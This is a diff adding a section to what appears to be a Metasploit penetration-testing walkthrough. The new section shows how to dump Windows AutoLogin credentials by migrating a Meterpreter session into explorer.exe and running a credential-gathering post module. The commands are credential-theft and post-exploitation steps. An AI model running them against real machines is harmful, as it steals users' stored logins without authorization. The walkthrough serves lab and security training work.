@@ -40,3 +40,14 @@ set LPORT 4444
 exploit
 ```
 >Note : Use same LHOST and LPORT as used previously.
+
+#### Dumping Autologin information
+> To extract AutoLogin stored credentials from the target machine we need to migrate current process to explorer.exe sothat we have full control to users environment.
+```
+migrate -N explorer.exe
+
+background
+use post/windows/gather/credentials/windows_autologin
+set SESSION 3
+exploit
+```
